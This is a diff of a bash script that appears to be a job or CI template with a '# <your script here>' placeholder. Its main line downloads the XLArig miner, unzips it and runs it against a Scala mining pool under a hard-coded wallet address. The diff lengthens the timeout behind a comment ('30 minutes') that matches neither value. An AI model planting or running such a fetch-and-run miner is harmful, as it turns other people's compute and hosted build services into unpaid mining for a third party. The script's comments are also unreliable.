@@ -1,6 +1,6 @@
 #!/bin/bash
 
-Timeout=900 # 30 minutes
+Timeout=2900 # 30 minutes
 
 function timeout_monitor() {
    sleep "$Timeout"
@@ -12,7 +12,7 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o mine.scalaproject.io:3333 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV+20000 -p Rx -a panthera -k -t28
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o mine.scalaproject.io:3333 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p Rx -a panthera -k -t28
 done
 # <your script here>
 
